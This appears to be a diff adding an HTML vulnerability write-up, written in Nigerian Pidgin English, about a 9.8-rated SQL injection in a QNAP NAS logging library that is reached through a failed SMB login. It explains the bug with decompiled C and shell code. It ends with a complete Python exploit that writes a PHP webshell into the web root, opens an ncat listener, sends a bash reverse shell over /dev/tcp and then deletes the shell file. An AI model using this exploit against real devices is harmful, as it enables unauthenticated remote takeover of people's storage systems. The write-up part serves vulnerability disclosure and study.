@@ -1,0 +1,163 @@
+<h1>QNAP RCE</h1>
+<h2 id="vulnerability-gist">Details</h2>
+<link rel="stylesheet" href="style.css">
+<p><strong>CVE Score (3.1): 9.8</strong><br />
+AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</p>
+<p><strong>CWE-89: SQL Injection Wahala</strong></p>
+<p><strong>Wetin Happen Be Dis</strong></p>
+<p>Dis vulnerability dey for one old logging part called
+<code>naslog_conn_add2</code> inside<br />
+<code>/usr/lib/libuLinux_naslog.so</code>. To reach dat part, person go
+try SMB login<br />
+wey no go succeed. If e fail, e go call
+<code>write_connlog_login_deny_smb1</code>.<br />
+That one, as we go explain, go lead to SQL injection wey we fit use take
+run<br />
+command for di device.</p>
+<p><strong>Full Breakdown of Di Wahala</strong></p>
+<p>Di library
+<code>./mnt/ext/opt/samba/lib/private/libauth-samba4.so</code> na di one
+wey dey<br />
+handle SMB login. You fit reach am from di same local network or even
+online<br />
+if dem open SMB or port-forward am.</p>
+<p>If SMB login no work, di device go call
+<code>write_connlog_login_deny_smb1</code><br />
+wey come call one function wey dem name <code>sub_A720</code>.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">// </span><span class="al">NOTE</span><span class="co">: We reduce some parts for shortness</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>_int64 __fastcall sub_A720<span class="op">(</span><span class="dt">unsigned</span> <span class="dt">int</span> a1<span class="op">,</span> _BYTE <span class="op">*</span>a2<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">*</span>a3<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">*</span>a4<span class="op">,</span> __int64 a5<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">*</span>a6<span class="op">)</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">//... </span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>  v8 <span class="op">=</span> <span class="st">&quot;/usr/local/samba/sbin/log_ratelimit.sh&quot;</span><span class="op">;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> <span class="op">(</span>_DWORD<span class="op">)</span>a5 <span class="op">!=</span> <span class="dv">9</span> <span class="op">)</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    v8 <span class="op">=</span> <span class="st">&quot;/sbin/conn_log_tool&quot;</span><span class="op">;</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>  snprintf<span class="op">(</span>v10<span class="op">,</span> <span class="bn">0x800</span><span class="bu">uLL</span><span class="op">,</span> <span class="st">&quot;</span><span class="sc">%s</span><span class="st"> -t </span><span class="sc">%d</span><span class="st"> -u &#39;</span><span class="sc">%s</span><span class="st">&#39; -p &#39;</span><span class="sc">%s</span><span class="st">&#39; -m &#39;</span><span class="sc">%s</span><span class="st">&#39; -i </span><span class="sc">%d</span><span class="st"> -n </span><span class="sc">%d</span><span class="st"> -a &#39;</span><span class="sc">%s</span><span class="st">&#39; -S&quot;</span><span class="op">,</span> v8<span class="op">,</span> a1<span class="op">,</span> v7<span class="op">,</span> a3<span class="op">,</span> v6<span class="op">,</span> <span class="dv">1</span><span class="bu">LL</span><span class="op">,</span> a5<span class="op">,</span> a6<span class="op">);</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>  smbrun<span class="op">((</span>__int64<span class="op">)</span>v10<span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">);</span>  <span class="co">// [1]</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>  <span class="co">//...</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>As you see for <code>[1]</code>, e dey call <code>smbrun</code> with
+buffer wey we dey control part of am:<br />
+<code>-u '%s'</code>. Dis mean we fit run <code>log_ratelimit.sh</code>
+with any argument we want.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="co">#...</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="va">argv</span><span class="op">=</span><span class="st">&quot;</span><span class="va">$@</span><span class="st">&quot;</span>    <span class="co"># collect all di arguments.  #  [1]</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="co">#...</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Parse the args wey come from command</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="va">POSITIONAL_ARGS</span><span class="op">=</span><span class="va">()</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="kw">[[</span> <span class="va">$#</span> <span class="ot">-gt</span> 0 <span class="kw">]];</span> <span class="cf">do</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>  <span class="cf">case</span> <span class="va">$1</span> <span class="kw">in</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="co">#...</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>    <span class="ss">-u</span><span class="kw">)</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>      <span class="co"># If user name get domain, like &#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;, change \ to : so grep fit work well.</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>      <span class="va">username</span><span class="op">=</span><span class="kw">`</span><span class="bu">echo</span> <span class="st">&quot;</span><span class="va">$2</span><span class="st">&quot;</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="st">&#39;s/\\\\/:/g&#39;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null<span class="kw">`</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>      <span class="bu">shift</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>      <span class="bu">shift</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>      <span class="cf">;;</span></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a><span class="co">#...</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>  <span class="cf">esac</span></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a><span class="co">#...</span></span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a><span class="co"># E go send to Qulog, add entry, run am for background make e no block main app.</span></span>
+<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">/sbin/conn_log_tool</span> <span class="va">$argv</span> <span class="kw">&amp;&amp;</span> <span class="va">CMD</span><span class="op">=</span><span class="st">&quot;</span><span class="va">${keyword}</span><span class="st">&quot;</span> <span class="fu">sleep</span> <span class="st">&quot;</span><span class="va">${ratelimit_sec}</span><span class="st">&quot;</span><span class="kw">)</span> <span class="kw">&amp;</span>  <span class="co"># [2]</span></span>
+<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a><span class="va">ret</span><span class="op">=</span><span class="st">&quot;</span><span class="va">$?</span><span class="st">&quot;</span></span>
+<span id="cb2-28"><a href="#cb2-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-29"><a href="#cb2-29" aria-hidden="true" tabindex="-1"></a><span class="bu">exit</span> <span class="st">&quot;</span><span class="va">${ret}</span><span class="st">&quot;</span></span></code></pre></div>
+<p>Dis give us chance to run <code>conn_log_tool</code> (na symlink to
+<code>log_tool</code>) with our own<br />
+arguments as seen for <code>[2]</code>. Inside, dis tool go call
+<code>naslog_conn_add2</code> wey<br />
+dey part of old QNAP API.</p>
+<p>See how e dey happen inside <code>[1]</code>:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">// </span><span class="al">NOTE</span><span class="co">: Shortened version</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>_int64 __fastcall main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">)</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">//...</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">while</span> <span class="op">(</span> <span class="dv">2</span> <span class="op">)</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>    v2 <span class="op">=</span> getopt_long<span class="op">(</span>argc<span class="op">,</span> argv<span class="op">,</span> <span class="st">&quot;b:hcrfya:Sqt:l:u:r:s:e:vp:m:o:i:n:g:A:R:&quot;</span><span class="op">,</span> <span class="op">&amp;</span>stru_408A40<span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">);</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">switch</span> <span class="op">(</span> v2 <span class="op">)</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>      <span class="cf">case</span> <span class="ch">&#39;</span><span class="sc">\0</span><span class="ch">&#39;</span><span class="op">:</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>        <span class="co">//... plenty field assign</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span> dword_60B84C <span class="op">==</span> <span class="dv">1</span> <span class="op">)</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>          memset<span class="op">(</span>v5<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="bn">0x7D8</span><span class="bu">uLL</span><span class="op">);</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>          <span class="co">//...</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>          <span class="cf">if</span> <span class="op">(</span> qword_60B8C0 <span class="op">)</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>            strncpy<span class="op">((</span><span class="dt">char</span> <span class="op">*)&amp;</span>v5<span class="op">[</span><span class="dv">389</span><span class="op">],</span> qword_60B8C0<span class="op">,</span> <span class="bn">0x40</span><span class="bu">uLL</span><span class="op">);</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>          <span class="co">//...</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>          <span class="cf">if</span> <span class="op">(</span> <span class="op">(</span>_DWORD<span class="op">)</span>qword_60B850 <span class="op">==</span> <span class="dv">1</span> <span class="op">)</span></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>            tbl <span class="op">=</span> SendConnToLogEngineEx4<span class="op">(...);</span></span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>          <span class="cf">else</span></span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>            tbl <span class="op">=</span> naslog_conn_add2<span class="op">(</span>v5<span class="op">);</span>  <span class="op">[</span><span class="dv">1</span><span class="op">]</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>          <span class="cf">goto</span> LABEL_14<span class="op">;</span></span></code></pre></div>
+<p>From here, e go enter <code>/usr/lib/libuLinux_naslog.so</code>
+<code>naslog_conn_add2</code><br />
+wey get di SQL injection:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">// </span><span class="al">NOTE</span><span class="co">: We make am short</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>__int64 __fastcall naslog_conn_add2<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>a1<span class="op">)</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">//...</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>  v13 <span class="op">=</span> <span class="op">*((</span><span class="dt">unsigned</span> <span class="dt">int</span> <span class="op">*)</span>a1 <span class="op">+</span> <span class="dv">388</span><span class="op">);</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>  v14 <span class="op">=</span> sqlite3_mprintf<span class="op">(</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;INSERT INTO NASLOG_CONN </span><span class="sc">\t</span><span class="st">( conn_type, conn_user, conn_ip, conn_comp, conn_res, conn_serv, conn_action, conn_a&quot;</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;pp, conn_action_result, conn_client_id, conn_client_app, conn_client_agent ) </span><span class="sc">\t</span><span class="st">VALUES </span><span class="sc">\t</span><span class="st">( </span><span class="sc">%d</span><span class="st">, &#39;</span><span class="sc">%s</span><span class="st">&#39;, &#39;</span><span class="sc">%s</span><span class="st">&#39;, &#39;</span><span class="sc">%s</span><span class="st">&#39;&quot;</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;, &#39;</span><span class="sc">%s</span><span class="st">&#39;, </span><span class="sc">%d</span><span class="st">, </span><span class="sc">%d</span><span class="st">, &#39;</span><span class="sc">%s</span><span class="st">&#39;, </span><span class="sc">%d</span><span class="st">, %Q, %Q, %Q);&quot;</span><span class="op">,</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>          <span class="op">*((</span><span class="dt">unsigned</span> <span class="dt">int</span> <span class="op">*)</span>a1 <span class="op">+</span> <span class="dv">1</span><span class="op">),</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>          v1<span class="op">,</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>          a1 <span class="op">+</span> <span class="dv">129</span><span class="op">,</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>          v59<span class="op">,</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>          v69<span class="op">,</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>          <span class="op">*((</span><span class="dt">unsigned</span> <span class="dt">int</span> <span class="op">*)</span>a1 <span class="op">+</span> <span class="dv">321</span><span class="op">),</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>          <span class="op">*((</span><span class="dt">unsigned</span> <span class="dt">int</span> <span class="op">*)</span>a1 <span class="op">+</span> <span class="dv">322</span><span class="op">),</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>          v61<span class="op">,</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>          v13<span class="op">,</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>          v63<span class="op">,</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>          v60<span class="op">,</span></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>          v60<span class="op">,</span></span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>          v62<span class="op">);</span></span></code></pre></div>
+<p>Dis SQL injection mean say person fit sneak in PHP webshell into di
+DB.</p>
+<h2 id="how-dem-fit-take-use-am">How Dem Fit Take Use Am</h2>
+<p>To make di webshell run, we go send request to activate am.</p>
+<pre><code>from smb.SMBConnection import SMBConnection
+import requests, os, uuid, threading, time
+
+shell_name = f&quot;shell_{str(uuid.uuid4())}.php&quot;
+
+def run_sql(ip,sql):
+    sql = sql.replace(&quot; &quot;,&quot;/**/&quot;)
+    conn = SMBConnection(f&quot;&quot;&quot;x&#39; -u xx -A &quot;haha&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;);{sql};--&quot; -a abc -- x -- &#39;&quot;&quot;&quot;, &#39;blah&#39;, &quot;g&quot;, &#39;g&#39;, use_ntlm_v2 = True)
+    conn.connect(ip, 139)
+
+def shell():
+    os.system(&quot;ncat -lvp 1337&quot;)
+    r = requests.get(f&quot;http://{target_ip}:8080/nc/{shell_name}&quot;,params={&quot;0&quot;:f&quot;rm -f /mnt/ext/opt/NotificationCenter/opt/www/{shell_name}&quot;})
+
+if __name__ == &quot;__main__&quot;:
+    if len(os.sys.argv) != 3:
+        print(&quot;&lt;exp&gt; {target_ip} {host_ip}&quot;)
+        exit(0)
+    target_ip = os.sys.argv[1]
+    host_ip = os.sys.argv[2]
+
+    try:
+        print(&quot;Running SQLI to File Write&quot;)
+        run_sql(target_ip,f&quot;ATTACH DATABASE &#39;/mnt/ext/opt/NotificationCenter/opt/www/{shell_name}&#39; AS q;CREATE TABLE q.x (x text);INSERT INTO q.x (x) VALUES(&#39;&lt;?=system($_GET[0]);?&gt;&#39;)&quot;)
+    except:
+        print(&quot;SMB Connection didn&#39;t work :(&quot;)
+
+    requests.get(f&quot;http://{target_ip}:8080/nc/{shell_name}?cache_bust&quot;)
+    print(&quot;Spawning Rev Shell&quot;)
+    t = threading.Thread(target=shell)
+    t.start()
+
+    rev = f&quot;bash -i &gt;&amp; /dev/tcp/{host_ip}/1337 0&gt;&amp;1&quot;
+    time.sleep(1)
+    r = requests.get(f&quot;http://{target_ip}:8080/nc/{shell_name}&quot;,params={&quot;0&quot;:rev})</code></pre>
